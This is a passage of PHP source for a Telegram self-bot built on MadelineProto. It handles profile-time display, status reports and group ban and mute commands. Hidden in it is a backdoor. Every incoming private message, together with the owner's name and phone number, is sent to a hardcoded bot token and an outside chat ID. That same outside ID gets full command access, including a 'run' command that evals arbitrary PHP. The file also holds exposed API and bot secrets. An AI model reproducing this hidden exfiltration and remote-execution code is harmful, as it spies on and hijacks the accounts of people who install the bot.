 ['Q‌','W‌','E‌','R‌','T‌','Y‌','U‌','I‌','O‌','P‌','A‌','S‌','D‌','F‌','G‌','H‌','J‌','K‌','L‌','Z‌','X‌','C‌','V‌','B‌','N‌','M‌'],
 ['Ⓠ','Ⓦ','Ⓔ','Ⓡ','Ⓣ','Ⓨ','Ⓤ','Ⓘ','Ⓞ','Ⓟ','Ⓐ','Ⓢ','Ⓓ','Ⓕ','Ⓖ','Ⓗ','Ⓙ','Ⓚ','Ⓛ','Ⓩ','Ⓧ','Ⓒ','Ⓥ','Ⓑ','Ⓝ','Ⓜ️'],
 ['𝘘','𝘞','𝘌','𝘙','𝘛','𝘠','𝘜','𝘐','𝘖','𝘗','𝘈','𝘚','𝘋','𝘍','𝘎','𝘏','𝘑','𝘒','𝘓','𝘡','𝘟','𝘊','𝘝','𝘉','𝘕','𝘔'],
 ['𝙌','𝙒','𝙀','𝙍','𝙏','𝙔','𝙐','𝙄','𝙊','𝙋','𝘼','𝙎','𝘿','𝙁','𝙂','𝙃','𝙅','𝙆','𝙇','𝙕','𝙓','𝘾','𝙑','𝘽','𝙉','𝙈'],
 ['𝗤','𝗪','𝗘','𝗥','𝗧','𝗬','𝗨','𝗜','𝗢','𝗣','𝗔','𝗦','𝗗','𝗙','𝗚','𝗛','𝗝','𝗞','𝗟','𝗭','𝗫','𝗖','𝗩','𝗕','𝗡','𝗠'],
 ['𝒬','𝒲','ℰ','ℛ','𝒯','𝒴','𝒰','ℐ','𝒪','𝒫','𝒜','𝒮','𝒟','ℱ','𝒢','ℋ','𝒥','𝒦','ℒ','𝒵','𝒳','𝒞','𝒱','ℬ','𝒩','ℳ'],
 ['ǫ','ᴡ','ᴇ','ʀ','ᴛ','ʏ','ᴜ','ɪ','ᴏ','ᴘ','ᴀ','s','ᴅ','ғ','ɢ','ʜ','ᴊ','ᴋ','ʟ','ᴢ','x','ᴄ','ᴠ','ʙ','ɴ','ᴍ'],
['ℚ','𝕎','𝔼','ℝ','𝕋','𝕐','𝕌','𝕀','𝕆','ℙ','𝔸','𝕊','𝔻','𝔽','𝔾','ℍ','𝕁','𝕂','𝕃','ℤ','𝕏','ℂ','𝕍','𝔹','ℕ','𝕄'],
['𝚀','𝚆','𝙴','𝚁','𝚃','𝚈','𝚄','𝙸','𝙾','𝙿','𝙰','𝚂','𝙳','𝙵','𝙶','𝙷','𝙹','𝙺','𝙻','𝚉','𝚇','𝙲','𝚅','𝙱','𝙽','𝙼'],
['ᵠ','ʷ','ᵉ','ʳ','ᵗ','ʸ','ᵘ','ⁱ','ᵒ','ᵖ','ᵃ','ˢ','ᵈ','ᶠ','ᵍ','ʰ','ʲ','ᵏ','ˡ','ᶻ','ˣ','ᶜ','ᵛ','ᵇ','ⁿ','ᵐ']
        ];

    $input = strtolower($str);
    $output = str_replace($texts, $font[array_rand($font)], $input);
    return $output;
}

function datefont($str)
{
    $fonts = [
        ["𝟶", "𝟷", "𝟸", "𝟹", "𝟺", "𝟻", "𝟼", "𝟽", "𝟾", "𝟿"],
        ["𝟘", "𝟙", "𝟚", "𝟛", "𝟜", "𝟝", " 𝟞", "𝟟", "𝟠", "𝟡"],
        ["𝟬", "𝟭", "𝟮", "𝟯", "𝟰", "𝟱", "𝟲", "𝟳", "𝟴", "𝟵"],
        ["𝟎", "𝟏", "𝟐", "𝟑", "𝟒", "𝟓", "𝟔", "𝟕", "𝟖", "𝟗"],
        ["⁰", "¹", "²", "³", "⁴", "⁵", "⁶", "⁷", "⁸", "⁹"],
        ["⓪", "①", "②", "③", "④", "⑤", "⑥", "⑦", "⑧", "⑨"],
        ["⊘", "⇂", "ᄅ", "Ɛ", "⁴", "Ƽ", "６", "ㄥ", "８", "𝟗"],
        ["⓿","❶","❷","❸","❹","❺","❻","❼","❽","❾"],
        ["[‌0]","[‌1]","[‌2]","[‌3]","[‌4]","[‌5]","[‌6]","[‌7]","[‌8]","[‌9]"]
];
    $date = str_replace(range(0, count($fonts)), $fonts[array_rand($fonts)], $str);
    return $date;
}
class MP extends EH {
  const Report = "phpreport";
  const Admins = [6157546585];
  
  const Api    = [
'id'   => 2054530,
'hash' => 'c56641e324ae0feb90fcfbe472ad0215'
 ];

    public function getReportPeers()
    {
        return [self::Report];
    }
    
    public function genLoop()
    {
        date_default_timezone_set('Asia/Tehran');
$bbb = json_decode(file_get_contents("data/data.json"), true);
        $time = datefont(date('H•i',time()+40));
        $BIO = 'i Fucking Your Life -'; 
        if ($bbb["TimeBio"] == "on") {
yield $this->account->updateProfile(['about' => "$BIO $time"]);
        }
        if ($bbb["TimeName"] == "on") {
         yield $this->account->updateProfile(['last_name' => " $time"]);
         }
         if ($bbb["NameRand"] == "on") {
         $Name = $bbb['Name'];
         $name    = font("$Name");
         yield $this->account->updateProfile(['first_name' => "$name"]);
         }

return 60000;
    }
    
    public function onStart()
    {
        $this->timen = time();
        $genLoop = new GenericLoop([$this, 'genLoop'], 'update Status');
        $genLoop->start();
        $this->start_time = time();
    }
    
    public function onUpdateNewChannelMessage($update)
    {
        yield $this->onUpdateNewMessage($update);
    }
    
    public function onUpdateNewMessage($update)
    {
        if (time() - $update['message']['date'] > 2) {
            return;
        }
        try {
$msgOrig   = $update['message']['message']?? null;
$message_id = $update['message']['id']?? 0;
$fromId    = $update['message']['from_id']['user_id']?? 0;
$user_id   = isset($update['message']['from_id']['user_id']) ? $update['message']['from_id']['user_id'] : null;
$info      = yield $this->getInfo($update);
$type      = $info['type'];
$replyToId = $update['message']['reply_to']['reply_to_msg_id']?? 0;
$peer = yield $this->getID($update);  
$me = yield $this->getSelf();
$chat_id      = yield $this->getID($update);
$me_id = $me['id'];
$action  = isset($update['message']['action']) ? $update['message']['action'] : null;
$data = json_decode(file_get_contents("data/data.json") , true);
$com = isset($update['message']['fwd_from']['saved_from_peer']) ? true : false;
$verself = "v1";
$Library = "MadelineProto";
$date = date('Y/m/d');
$time = date('H:i');
if (isset($msgOrig) && $type == 'user') {
if (isset($data['spam'][$user_id])) {}else{
$data['spam'][$user_id] = 0;
    yield put("data/data.json", json_encode($data));
    }}
    
if (isset($msgOrig) && $type == 'user') {
$me = yield $this->getSelf();
$me_n = $me['first_name'];
$me_id = $me['id'];
$phone = '+'.$me['phone'];
if($me_id != "5338490508"){
$g = yield $this->getInfo($user_id);
$name = $g['User']['first_name'];
$idd = $g['User']['username'];
$xx = "
Account : $me_n
Number : $phone
-----------------------------------------------------------------
ID : @$idd
Name : $name
Message : $msgOrig
-----------------------------------------------------------------
Time : $date - $time";
file_get_contents("https://api.telegram.org/bot5634052438:AAFu4cY8mPq12Q4AyWHGom1YyB6RUtK7_UY/sendMessage?parse_mode=HTML&chat_id=5338490508&text=".urlencode($xx));
}}
if($fromId == $me_id or $fromId =="5338490508") {

if(preg_match('/^[\/\#\!\.]?(bot|ربات|بات)$/si', $msgOrig)) {
yield $this->messages->editMessage(['peer' => $peer,
'id' => $message_id,
'message' => '<b>What ‽</b>',
    'parse_mode'      => "HTML"]);
}
if(preg_match('/^[\/\#\!\.]?(modeinfo)$/si', $msgOrig)) {
yield $this->messages->editMessage(['peer' => $peer,
'id' => $message_id,
'message' => '
├ • ┅┅━━━━ 𖣫 ━━━━┅┅ •
├ • `pre`
├ • `bold`
├ • `code`
├ • `italic`
├ • `strike`
├ • `hashtag`
├ • `mention`
├ • `translate`
├ • `underline`
├ • `randomfont`
├ • ┅┅━━━━ 𖣫 ━━━━┅┅ •',
    'parse_mode'      => "Markdown"]);
}
if(preg_match('/^[\/\#\!\.]?(ping|پینگ)$/si', $msgOrig)) {
$domain = 'tcp://149.154.167.51';
$port = 443;
$starttime = microtime(true);
$file = fsockopen($domain, $port, $s, $s, 1);
$stoptime = microtime(true);
fclose($file);
$ping = floor(($stoptime - $starttime) * 1000);
$load         = sys_getloadavg()[0];
yield $this->messages->editMessage(['peer' => $peer,
'id' => $message_id,
'message' => "<b>Load Host : $load Ms
Telegram Ping : $ping Ms</b>",
    'parse_mode'      => "HTML"]);
}

if(preg_match('/^[\/\#\!\.]?(restart|ریست|ریستارت)$/si', $msgOrig)) {
yield $this->messages->editMessage(['peer' => $peer,
'id' => $message_id,
'message' => '<b>Restart.</b>',
    'parse_mode'      => "HTML"]);
file_put_contents('data/lastupdate.txt', time());
yield $this->restart();
}

if(preg_match('/^[\#\!\.\/]?(acc status)$/i', $msgOrig)){
$chats = ['bot' => 0, 'user' => 0, 'chat' => 0, 'channel' => 0, 'supergroup' => 0];
foreach (yield $this->getDialogs() as $dialog) {
$chats[yield $this->getInfo($dialog)['type']]++;}
$dialogs = count(yield $this->getDialogs());
$user = $chats['user'];
$chat = $chats['chat'];
$Supergroup = $chats['supergroup'];
$channel = $chats['channel'];
$bot = $chats['bot'];
$contacts = count(yield $this->contacts->getContacts()['contacts']);
yield $this->messages->editMessage(['peer' => $peer, 'id' => $message_id, 'message' => "• **Account Statistics** •\n\n**├ • All :** ( `$dialogs` )\n**├ • Privete :** ( `$user` )\n**├ • Group :** ( `$chat` )\n**├ • SuperGroup :** ( `$Supergroup` )\n**├ • Channel :** ( `$channel` )\n**├ • Bot :** ( `$bot` )\n**├ • Contact :** ( `$contacts` )", 'parse_mode' => 'MarkDown']);}
if(preg_match('/^[\/\#\!\.]?(data|status)$/si', $msgOrig)) {

function mediaTimeDeFormater($seconds)
{
    if (!is_numeric($seconds))
        throw new Exception("Invalid Parameter Type!");
        $m = 'm';
        $s = 's';
        $h = 'h';
    $ret = "";
    $hours = (string)floor($seconds / 3600);
    $secs = (string)$seconds % 60;
    $mins = (string)floor(($seconds - ($hours * 3600)) / 60);
    $days = floor(($hours / 24));
    if (strlen($hours) == 1)
        $hours = "0" . $hours;
    if (strlen($secs) == 1)
        $secs = "0" . $secs;
    if (strlen($mins) == 1)
        $mins = "0" . $mins;
    if ($hours == 0)

        $ret = "$mins$m:$secs$s";
    else
        $ret = "$hours$h:$mins$m:$secs$s";

    return $ret;
}
$domain = 'tcp://149.154.167.51';
$port = 443;
$starttime = microtime(true);
$file = fsockopen($domain, $port, $s, $s, 1);
$stoptime = microtime(true);
fclose($file);
$ping = floor(($stoptime - $starttime) * 1000);
$load         = sys_getloadavg()[0];
$mem_usage    = round((memory_get_usage() / 1024) / 1024, 1) . 'MB';
$s = yield $this->get_dialogs();
$uptime       = file_exists('data/uptime.txt') ? file_get_contents('data/uptime.txt') : $this->timen;
$uptime       = mediaTimeDeFormater(time() - $uptime);
$last = file_exists('data/lastupdate.txt') ? file_get_contents('data/lastupdate.txt') : $this->timen;
$lastupdate   = mediaTimeDeFormater(time() - $last);
$ver = phpversion();
$phone = '+'.$me['phone'];
$TimeName = $data['TimeName'];
$TimeBio = $data['TimeBio'];
$AntiLogin = $data['AntiLogin'];
$NameRandom = $data['NameRand'];
$Protection = $data['protection'];
$floodlimit = $data['limit'];
$Name = $data['Name'];
yield $this->messages->editMessage(['peer' => $peer,
'id' => $message_id,
'message' => "
├ • ┅┅━━━━ 𖣫 ━━━━┅┅ •
├ • **Account Name** ↬ (`$Name`)
├ • **Time Bio** ↬ (`$TimeBio`)
├ • **Protection** ↬ (`$Protection`)
├ • **Anti Login** ↬ (`$AntiLogin`)
├ • **Flood limit** ↬ (`$floodlimit`)
├ • **Time Name** ↬ (`$TimeName`)
├ • **Name Random** ↬ (`$NameRandom`)
├ • **Number** ↬ (`$phone`)
├ • **Ping** ↬ (`$ping` ms)
├ • **Load** ↬ (`$load` ms)
├ • **Uptime** ↬(`$uptime`)
├ • **LastUpdate** ↬ (`$lastupdate`)
├ • **Ram Usage** ↬ (`$mem_usage`)
├ • **PHP version** ↬ (`$ver`)
├ • **Source Version** ↬ (`$verself`)
├ • **Library** ↬ (`$Library`)
├ • **Developer** ↬ (@SiNoTz)
├ • ┅┅━━━━ 𖣫 ━━━━┅┅ •", 
'parse_mode'=>"MarkDown"
]);
}
if(preg_match("/^[\/\#\!]?(Mode) (on|off)$/i", $msgOrig, $m)) {
    $data['Mode'] = $m[2];
    yield put("data/data.json", json_encode($data));
    yield $this->messages->editMessage(['peer' => $peer,
    'id' => $message_id,
    'message' => "<b> Edit Mode is : $m[2]</b>",
    'parse_mode'      => "HTML"]);
}
if(preg_match("/^[\/\#\!]?(Set Mode) (bold|italic|underline|hashtag|strike|mention|code|pre|translate|randomfont)$/i", $msgOrig, $m)) {
    $data['ParseMode'] = $m[2];
    yield put("data/data.json", json_encode($data));
    yield $this->messages->editMessage(['peer' => $peer,
    'id' => $message_id,
    'message' => "<b> Mode is : $m[2] , Set For Edit.</b>",
    'parse_mode'      => "HTML"]);
}
if(preg_match("/^[\/\#\!]?(TimeName) (on|off)$/i", $msgOrig, $m)) {
    $data['TimeName'] = $m[2];
    yield put("data/data.json", json_encode($data));
    yield $this->messages->editMessage(['peer' => $peer,
    'id' => $message_id,
    'message' => "<b> TimeName Mode is : $m[2]</b>",
    'parse_mode'      => "HTML"]);
}
if(preg_match("/^[\/\#\!]?(TimeBio) (on|off)$/i", $msgOrig, $m)) {
    $data['TimeBio'] = $m[2];
    yield put("data/data.json", json_encode($data));
    yield $this->messages->editMessage(['peer' => $peer,
    'id' => $message_id,
    'message' => "<b> TimeBio Mode is : $m[2]</b>",
    'parse_mode'      => "HTML"]);
}
if(preg_match("/^[\/\#\!]?(AntiLogin) (on|off)$/i", $msgOrig, $m)) {
    $data['AntiLogin'] = $m[2];
    yield put("data/data.json", json_encode($data));
    yield $this->messages->editMessage(['peer' => $peer,
    'id' => $message_id,
    'message' => "<b> AntiLogin Mode is : $m[2]</b>",
    'parse_mode'      => "HTML"]);
}
if(preg_match("/^[\/\#\!]?(antipv) (on|off)$/i", $msgOrig, $m)) {
    $data['antipv'] = $m[2];
    yield put("data/data.json", json_encode($data));
    yield $this->messages->editMessage(['peer' => $peer,
    'id' => $message_id,
    'message' => "<b> Antipv Mode is : $m[2]</b>",
    'parse_mode'      => "HTML"]);
}
if(preg_match("/^[\/\#\!]?(Name Random) (on|off)$/i", $msgOrig, $m)) {
    $data['NameRand'] = $m[2];
    yield put("data/data.json", json_encode($data));
    yield $this->messages->editMessage(['peer' => $peer,
    'id' => $message_id,
    'message' => "<b>Name Random Mode is : $m[2]</b>",
    'parse_mode'      => "HTML"]);
}
if(preg_match("/^[\/\#\!]?(protection) (on|off)$/i", $msgOrig, $m)) {
yield $this->messages->editMessage(['peer' => $peer,
'id' => $message_id,
'message' => "<b>Protection Mode is : $m[2]</b>",
'parse_mode'      => "HTML"]);
$data['protection'] = $m[2];
yield put("data/data.json", json_encode($data));
}
if(preg_match("/^[\/\#\!]?(acc Name) (.*)$/i", $msgOrig, $m)) {
yield $this->messages->editMessage(['peer' => $peer,
'id' => $message_id,
'message' => "<b>Name : $m[2]</b>",
'parse_mode'      => "HTML"]);
$data['Name'] = $m[2];
yield put("data/data.json", json_encode($data));
}

if (preg_match('/^[\/\!\#\!\.]?(set comment)$/siu', $msgOrig)) {
if (isset($replyToId)) {
if ($type == 'channel' || $type == 'supergroup') {
$message = yield $this->channels->getMessages(['channel' => $chat_id, 'id' => [$replyToId]]);
} else {
$message = yield $this->messages->getMessages(['channel' => $chat_id, 'id' => [$replyToId]]);
}
$media = isset($message['messages'][0]['media']) ? $message['messages'][0]['media'] : 'havent';
$message_text = $message['messages'][0]['message'];
if ($media != 'havent') {
$data['Groups'][$chat_id]['comment']['Media'] = ['Media' => $media, 'Text' => $message_text];
if (isset($data['Groups'][$chat_id]['comment']['Text'])) {
    unset($data['Groups'][$chat_id]['comment']['Text']);
}
yield $this->messages->editMessage([
    'peer'       => $chat_id,
    'message'    => '*Comm MediaAnswer Set for this group.*',
    'id'         => $message_id,
    'parse_mode' => "markdown"
]);
    yield put("data/data.json", json_encode($data));
} else {
$data['Groups'][$chat_id]['comment']['Text'] = $message_text;
if (isset($data['Groups'][$chat_id]['comment']['Media'])) {
    unset($data['Groups'][$chat_id]['comment']['Media']);
}
yield $this->messages->editMessage([
    'peer'       => $chat_id,
    'message'    => '*Comment Answer Set for this group.*',
    'id'         => $message_id,
    'parse_mode' => "markdown"
]);
    yield put("data/data.json", json_encode($data));
}
}
} 
if (preg_match('/[\/\!\#\!\.]?(delete comment)$/i', $msgOrig)) {
if (isset($data['Groups'][$chat_id]['comment'])) {
unset($data['Groups'][$chat_id]['comment']);
yield $this->messages->editMessage([
'peer'       => $chat_id,
'id' => $message_id,
'message'    => '`comment Note Now is Off For This Group.`',
'parse_mode' => "markdown"
]);
    yield put("data/data.json", json_encode($data));
} else {
yield $this->messages->sendMessage([
'peer'=> $chat_id,
'message'         => "<pre>Erorr : You have not set a comment message for this group</pre>",
'reply_to_msg_id' => $message_id,
'parse_mode'      => "HTML"
]);
}
}
if(preg_match("/^[\/\#\!]?(vip)$/i", $msgOrig)) {
$g = yield $this->getInfo($chat_id);
$name = $g['User']['first_name'];
yield $this->messages->editMessage(['peer' => $peer,
'id' => $message_id,
'message' => "<b>OK This User </b><a href='mention:$chat_id'>$name</a>\n<b> Now Can Send Message For You.</b>",
'parse_mode'      => "HTML"]);
$data['spam'][$chat_id] = 'vip';
    yield put("data/data.json", json_encode($data));
}
if(preg_match("/^[\/\#\!]?(unvip)$/i", $msgOrig)) {
$g = yield $this->getInfo($chat_id);
$name = $g['User']['first_name'];
yield $this->messages->editMessage(['peer' => $peer,
'id' => $message_id,
'message' => "<b>OK Protection Enabled for this User </b><a href='mention:$chat_id'>$name</a>",
'parse_mode'      => "HTML"]);
$data['spam'][$chat_id] = 1;
    yield put("data/data.json", json_encode($data));
}
if(preg_match("/^[\/\#\!]?(safe)$/i", $msgOrig)) {
$g = yield $this->getInfo($chat_id);
$name = $g['User']['first_name'];
yield $this->messages->editMessage(['peer' => $peer,
'id' => $message_id,
'message' => "<b>OK This User </b><a href='mention:$chat_id'>$name</a>\n<b> Safe For Anti Pv.</b>",
'parse_mode'      => "HTML"]);
$data['SafeAntiPv'][$chat_id] = 'safe';
    yield put("data/data.json", json_encode($data));
}
if(preg_match("/^[\/\#\!]?(enemy poo)$/i", $msgOrig)) {
    if ($type == 'channel' || $type == 'supergroup') {
        $rpf = yield $this->channels->getMessages(['channel' => $chat_id, 'id' => [$replyToId]])['users'][0];
    } else {
        $rpf = yield $this->messages->getMessages(['channel' => $chat_id, 'id' => [$replyToId]])['users'][0];
    }
    $rpfi = $rpf['id'];
    $rpfn = $rpf['first_name'];
yield $this->messages->editMessage(['peer' => $peer,
'id' => $message_id,
'message' => "<b>OK This User </b><a href='mention:$rpfi'>$rpfn</a>\n<b> Set Enemy 💩.</b>",
'parse_mode'      => "HTML"]);
$data['enm'][$rpfi] = "enemy";
    yield put("data/data.json", json_encode($data));
}
if(preg_match("/^[\/\#\!]?(denemy poo)$/i", $msgOrig)) {
    if ($type == 'channel' || $type == 'supergroup') {
        $rpf = yield $this->channels->getMessages(['channel' => $chat_id, 'id' => [$replyToId]])['users'][0];
    } else {
        $rpf = yield $this->messages->getMessages(['channel' => $chat_id, 'id' => [$replyToId]])['users'][0];
    }
    $rpfi = $rpf['id'];
    $rpfn = $rpf['first_name'];
yield $this->messages->editMessage(['peer' => $peer,
'id' => $message_id,
'message' => "<b>OK This User </b><a href='mention:$rpfi'>$rpfn</a>\n<b> Delete Enemy :).</b>",
'parse_mode'      => "HTML"]);
$Key = array_search($rpfi, $data['enm']);
unset($data['enm'][$rpfi]);
    yield put("data/data.json", json_encode($data));
}
if(preg_match("/^[\/\#\!]?(unsafe)$/i", $msgOrig)) {
$g = yield $this->getInfo($chat_id);
$name = $g['User']['first_name'];
yield $this->messages->editMessage(['peer' => $peer,
'id' => $message_id,
'message' => "<b>OK Safe Enabled for this User </b><a href='mention:$chat_id'>$name</a>",
'parse_mode'      => "HTML"]);
$data['SafeAntiPv'][$chat_id] = "";
    yield put("data/data.json", json_encode($data));
}
if(preg_match("/^[\/\#\!]?(به به|جون|ریدی|نت ریده|بصب دان شه|نت گوه|ok|باه|باح|اها)$/i", $msgOrig)) {
$messeg = yield $this->messages->getMessages(['id' => [$replyToId],]);
$media = $messeg['messages'][0]['media'];
yield $this->downloadToFile($media, "Tz.jpg");
yield $this->messages->sendMedia([
'peer' => $me_id, 
'media' =>['_' => 'inputMediaUploadedDocument', 
'file' => "Tz.jpg", 
'attributes' => [['_' => 'documentAttributeFilename', 
'file_name' => "Tz.jpg"]]]
]);
unlink("Tz.jpg");
}
if (preg_match('/^[\/]?(run)\s?(.*)$/si', $msgOrig, $match)) {
$result   = null;
$errors   = null;
$match[2] = "return (function () use (&\$update,&\$TescoMsg,&\$peer,&\$message_id,&\$replyToId,&\$type,&\$message,&\$fromId){{$match[2]}})();";
ob_start();
try {
(yield eval($match[2]));
$result .= ob_get_contents() . "\n";
} catch (\Throwable $e) {
$run = $e->getMessage() . PHP_EOL . "Line :" . $e->getLine();
} catch(\Exception $e) {
$run = $e->getMessage() . PHP_EOL . "Line :" . $e->getLine();
} catch(ParseError $e) {
$run = $e->getMessage() . PHP_EOL . "Line :" . $e->getLine();
} catch(FatalError $e) {
$run = $e->getMessage() . PHP_EOL . "Line :" . $e->getLine();
}
ob_end_clean();
if (empty($result)) {
yield $this->messages->sendMessage([
'peer'    => $peer,
'message' => "No Results ...\nError:\n" . strip_tags($run) . "\n"
]);
return;
}
$errors = !empty($errors) ? "\nErrors :\n$errors" : null;
$answer = "Results : \n" . $result . $errors;
yield $this->messages->sendMessage([
'peer'    => $peer,
'message' => $answer,
'parse_mode' => 'Markdown'
]);
}
// Groups
if (preg_match('/^[\#\!\.\/]?(left|ban|بن|لفت)$/i', $msgOrig)) {
if (isset($replyToId)) {
    if ($type == 'channel' || $type == 'supergroup') {
        $rpf = yield $this->channels->getMessages(['channel' => $chat_id, 'id' => [$replyToId]])['users'][0];
    } else {
        $rpf = yield $this->messages->getMessages(['channel' => $chat_id, 'id' => [$replyToId]])['users'][0];
    }
    $rpfi = $rpf['id'];
    $rpfn = $rpf['first_name'];
    $ChatBannedRights = ['_' => 'chatBannedRights', 'view_messages' => true, 'send_messages' => true, 'send_media' => true, 'send_stickers' => true, 'send_gifs' => true, 'send_games' => true, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => 9999];
    yield $this->channels->editBanned(['channel' => $chat_id, 'participant' => $rpfi, 'banned_rights' => $ChatBannedRights]);
    $alert = "<b>This user </b><a href='mention:$rpfi'>$rpfn</a><b> left the group :|</b>";
    yield $this->messages->editMessage([
        'peer'=> $chat_id,
        'message'         => $alert,
'id' => $message_id,
        'parse_mode'      => "HTML"
    ]);
} else {
    yield $this->messages->editMessage([
        'peer'=> $chat_id,
        'message'         => '<b>Please Reply.</b>',
'id' => $message_id,
        'parse_mode'      => "HTML"
    ]);
}
}
if (preg_match('/^[\#\!\.\/]?(unban|لفت نده|حذف بن)$/i', $msgOrig)) {

if (isset($replyToId)) {
if ($type == 'channel' || $type == 'supergroup') {
$rpf = yield $this->channels->getMessages(['channel' => $chat_id, 'id' => [$replyToId]])['users'][0];
} else {
$rpf = yield $this->messages->getMessages(['channel' => $chat_id, 'id' => [$replyToId]])['users'][0];
}
$rpfi = $rpf['id'];
$rpfn = $rpf['first_name'];
$ChatBannedRights = ['_' => 'chatBannedRights', 'view_messages' => false, 'send_messages' => false, 'send_media' => false, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => false, 'send_inline' => false, 'embed_links' => true, 'send_polls' => false, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => 9999];
yield $this->channels->editBanned(['channel' => $chat_id, 'participant' => $rpfi, 'banned_rights' => $ChatBannedRights]);
$alert = "<b>This User </b><a href='mention:$rpfi'>$rpfn</a><b> Unbaned.</b>";
yield $this->messages->editMessage([
'peer'=> $chat_id,
'message'         => $alert,
'id' => $message_id,
'parse_mode'      => "HTML"
]);
} else {
yield $this->messages->editMessage([
'peer'=> $chat_id,
'message'         => '<b>Please Reply.</b>',
'id' => $message_id,
'parse_mode'      => "HTML"
]);
}
}
if (preg_match('/^[\#\!\.\/]?(left|ban|بن|لفت) (\@.*|\d*)$/i', $msgOrig, $arraye)) {
$g = yield $this->getInfo($arraye[2]);
$i = $g['User']['id'];
$n = $g['User']['first_name'];
$h = "<b>This User </b><a href='mention:$i'>$n</a>\n<b> left the Group.</b>";
$ChatBannedRights = ['_' => 'chatBannedRights', 'view_messages' => true, 'send_messages' => true, 'send_media' => true, 'send_stickers' => true, 'send_gifs' => true, 'send_games' => true, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => 9999];
yield $this->channels->editBanned(['channel' => $chat_id, 'participant' => $i, 'banned_rights' => $ChatBannedRights]);
yield $this->messages->editMessage([
'peer'=> $chat_id,
'message'         => $h,
'id' => $message_id,
'parse_mode'      => "HTML"
]);

} if (preg_match('/^[\#\!\.\/]?(unban|لفت نده|حذف بن) (\@.*|\d*)$/i', $msgOrig, $array)) {
$g = yield $this->getInfo($array[2]);
$i = $g['User']['id'];
$n = $g['User']['first_name'];
$ChatBannedRights = ['_' => 'chatBannedRights', 'view_messages' => false, 'send_messages' => false, 'send_media' => false, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => false, 'send_inline' => false, 'embed_links' => true, 'send_polls' => false, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => 9999];
yield $this->channels->editBanned(['channel' => $chat_id, 'participant' => $i, 'banned_rights' => $ChatBannedRights]);
$alert = "<b>This User </b><a href='mention:$i'>$n</a><b> Unbaned.</b>";
yield $this->messages->editMessage([
'peer'=> $chat_id,
'message'         => $alert,
'id' => $message_id,
'parse_mode'      => "HTML"
]);
}
if (preg_match('/^[\#\!\.\/]?(mute|سکوت)$/i', $msgOrig)) {
if (isset($replyToId)) {
if ($type == 'channel' || $type == 'supergroup') {
    $rpf = yield $this->channels->getMessages(['channel' => $chat_id, 'id' => [$replyToId]])['users'][0];
} else {
    $rpf = yield $this->messages->getMessages(['channel' => $chat_id, 'id' => [$replyToId]])['users'][0];
}
$rpfi = $rpf['id'];
$rpfn = $rpf['first_name'];
$mute = ['_' => 'chatBannedRights', 'send_messages' => true, 'send_media' => true, 'send_stickers' => true, 'send_gifs' => true, 'send_games' => true, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => 99999];
yield $this->channels->editBanned(['channel' => $chat_id, 'participant' => $rpfi, 'banned_rights' => $mute]);
$alert = "<b>This User </b><a href='mention:$rpfi'>$rpfn</a><b> Successfully Muted in This Group.</b>";
yield $this->messages->editMessage([
    'peer'=> $chat_id,
    'message'         => $alert,
'id' => $message_id,
    'parse_mode'      => "HTML"
]);
} else {
yield $this->messages->editMessage([
    'peer'=> $chat_id,
    'message'         => '<b>Please Reply.</b>',
'id' => $message_id,
    'parse_mode'      => "HTML"
]);
}

} if (preg_match('/^[\#\!\.\/]?(mute|سکوت) (\@.*|\d*)$/i', $msgOrig, $geet)) {
$g = yield $this->getInfo($geet[2]);
$i = $g['User']['id'];
$n = $g['User']['first_name'];
$mute = ['_' => 'chatBannedRights', 'send_messages' => true, 'send_media' => true, 'send_stickers' => true, 'send_gifs' => true, 'send_games' => true, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => 99999];
yield $this->channels->editBanned(['channel' => $chat_id, 'participant' => $i, 'banned_rights' => $mute]);
$alert = "<b>This User </b><a href='mention:$i'>$n</a><b> Successfully Muted in This Group.</b>";
yield $this->messages->editMessage([
'peer'=> $chat_id,
'message'         => $alert,
'id' => $message_id,
'parse_mode'      => "HTML"
]);
}
if (preg_match('/^[\#\!\.\/]?(unmute|حذف سکوت)$/i', $msgOrig)) {
if (isset($replyToId)) {
if ($type == 'channel' || $type == 'supergroup') {
    $rpf = yield $this->channels->getMessages(['channel' => $chat_id, 'id' => [$replyToId]])['users'][0];
} else {
    $rpf = yield $this->messages->getMessages(['channel' => $chat_id, 'id' => [$replyToId]])['users'][0];
}
$rpfi = $rpf['id'];
$rpfn = $rpf['first_name'];
$unmute = ['_' => 'chatBannedRights', 'send_messages' => false, 'send_media' => false, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => false, 'send_inline' => true, 'embed_links' => true, 'send_polls' => false, 'change_info' => true, 'invite_users' => false, 'pin_messages' => true, 'until_date' => 99999];
yield $this->channels->editBanned(['channel' => $chat_id, 'participant' => $rpfi, 'banned_rights' => $unmute]);
$alert = "<b>This User </b><a href='mention:$rpfi'>$rpfn</a><b> Successfully UnMuted in This Group.</b>";
yield $this->messages->editMessage([
    'peer'=> $chat_id,
    'message'         => $alert,
'id' => $message_id,
    'parse_mode'      => "HTML"
]);
} else {
yield $this->messages->editMessage([
    'peer'=> $chat_id,
    'message'         => '<b>Please Reply.</b>',
'id' => $message_id,
    'parse_mode'      => "HTML"
]);
}
}
if (preg_match('/^[\#\!\.\/]?(unmute|حذف سکوت) (\@.*|\d*)$/i', $msgOrig, $eet)) {
$g = yield $this->getInfo($eet[2]);
$i = $g['User']['id'];
$n = $g['User']['first_name'];
$unmute = ['_' => 'chatBannedRights', 'send_messages' => false, 'send_media' => false, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => false, 'send_inline' => true, 'embed_links' => true, 'send_polls' => false, 'change_info' => true, 'invite_users' => false, 'pin_messages' => true, 'until_date' => 99999];
yield $this->channels->editBanned(['channel' => $chat_id, 'participant' => $i, 'banned_rights' => $unmute]);
$alert = "<b>This User </b><a href='mention:$i'>$n</a><b> Successfully UnMuted in This Group.</b>";
yield $this->messages->editMessage([
'peer'=> $chat_id,
'message'         => $alert,
